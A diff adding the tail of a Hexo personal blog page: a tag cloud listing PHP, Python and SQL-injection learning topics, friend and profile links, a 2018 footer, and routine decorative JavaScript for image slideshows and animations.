+    <a href="/tags/%E5%AE%89%E8%A3%85/" style="font-size: 10.806483954042708px;" class="tag-cloud-link">安装</a>
+    
+    <a href="/tags/php/" style="font-size: 19.92490703359417px;" class="tag-cloud-link">php</a>
+    
+    <a href="/tags/php%E5%87%BD%E6%95%B0/" style="font-size: 17.061326054600933px;" class="tag-cloud-link">php函数</a>
+    
+    <a href="/tags/%E7%AE%80%E5%8D%95%E7%BD%91%E7%AB%99%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/" style="font-size: 16.009082678516073px;" class="tag-cloud-link">简单网站功能实现</a>
+    
+    <a href="/tags/html/" style="font-size: 10.010950454268276px;" class="tag-cloud-link">html</a>
+    
+    <a href="/tags/postman/" style="font-size: 11.891297090198414px;" class="tag-cloud-link">postman</a>
+    
+    <a href="/tags/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" style="font-size: 12.244219024293855px;" class="tag-cloud-link">文件操作</a>
+    
+    <a href="/tags/python/" style="font-size: 14.76995363398538px;" class="tag-cloud-link">python</a>
+    
+    <a href="/tags/%E5%8F%98%E9%87%8F/" style="font-size: 17.925994536752405px;" class="tag-cloud-link">变量</a>
+    
+    <a href="/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size: 18.89245177031424px;" class="tag-cloud-link">字符串</a>
+    
+    <a href="/tags/%E5%88%97%E8%A1%A8/" style="font-size: 11.217190976641042px;" class="tag-cloud-link">列表</a>
+    
+    <a href="/tags/%E5%85%83%E7%BB%84/" style="font-size: 8.378508535754111px;" class="tag-cloud-link">元组</a>
+    
+    <a href="/tags/if%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD/" style="font-size: 19.655395083584253px;" class="tag-cloud-link">if条件判断</a>
+    
+    <a href="/tags/%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5/" style="font-size: 16.273346309284882px;" class="tag-cloud-link">循环语句</a>
+    
+    <a href="/tags/sql-%E6%B3%A8%E5%85%A5/" style="font-size: 15.769069090874135px;" class="tag-cloud-link">sql 注入</a>
+    
+    <a href="/tags/%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4/" style="font-size: 13.400458911243447px;" class="tag-cloud-link">操作步骤</a>
+    
+    <a href="/tags/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/" style="font-size: 18.31998878694688px;" class="tag-cloud-link">联合查询</a>
+    
+    <a href="/tags/sql%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0/" style="font-size: 18.1322376237916px;" class="tag-cloud-link">sql报错函数</a>
+    
+    <a href="/tags/bool%E5%92%8C%E7%9D%A1%E7%9C%A0%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" style="font-size: 16.4770760881203px;" class="tag-cloud-link">bool和睡眠盲注脚本</a>
+    
+    <a href="/tags/vue/" style="font-size: 8.129480501098982px;" class="tag-cloud-link">vue</a>
+    
+    <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" style="font-size: 14.739862288318655px;" class="tag-cloud-link">博客搭建</a>
+    
+    <a href="/tags/%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/" style="font-size: 13.541842910623924px;" class="tag-cloud-link">主题配置</a>
+    
+    <a href="/tags/ip%E5%92%8C%E8%B7%AF%E7%94%B1/" style="font-size: 11.811937797653075px;" class="tag-cloud-link">ip和路由</a>
+    
+    <a href="/tags/proxifier/" style="font-size: 15.518238345337242px;" class="tag-cloud-link">proxifier</a>
+    
+    <a href="/tags/wireshark%E6%8A%93%E5%8C%85/" style="font-size: 18.18601869318707px;" class="tag-cloud-link">wireshark抓包</a>
+    
+    <a href="/tags/sqlmap%E4%BD%BF%E7%94%A8/" style="font-size: 17.324747203450826px;" class="tag-cloud-link">sqlmap使用</a>
+    
+    <a href="/tags/sql%E7%BB%95%E8%BF%87/" style="font-size: 12.680946092045604px;" class="tag-cloud-link">sql绕过</a>
+    
+    <a href="/tags/sqlmap-tamper/" style="font-size: 18.394474703200665px;" class="tag-cloud-link">sqlmap tamper</a>
+    
+    <a href="/tags/sqlmap/" style="font-size: 10.729276443016317px;" class="tag-cloud-link">sqlmap</a>
+    
+    <a href="/tags/waf/" style="font-size: 12.265557394212859px;" class="tag-cloud-link">waf</a>
+    
+    <a href="/tags/BurpSuite/" style="font-size: 9.585258847611087px;" class="tag-cloud-link">BurpSuite</a>
+    
+    <a href="/tags/nmap/" style="font-size: 11.919419992907779px;" class="tag-cloud-link">nmap</a>
+    
+</div>
+                
+                
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="http://kdays.net/days/" target="_blank">KDays Forum</a>
+    </li>
+    
+    <li>
+        <a href="http://www.gal123.com/" target="_blank">绅士导航♂</a>
+    </li>
+    
+    <li>
+        <a href="http://www.moe123.com/" target="_blank">萌导航</a>
+    </li>
+    
+</div>
+                
+                
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="https://github.com/tanlinhuitlh/" target="_blank">Github</a>
+    </li>
+    
+    <li>
+        <a href="https://coding.net/u/SORA1" target="_blank">Coding</a>
+    </li>
+    
+    <li>
+        <a href="https://www.zhihu.com/people/aonosora/activities" target="_blank">知乎</a>
+    </li>
+    
+</div>
+                
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 明 尘 Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
+</body>
+
+<script src="/js/activate-power-mode.js"></script>
+
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '8'
+    }
+</script>
+
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+
+
+
+</html>
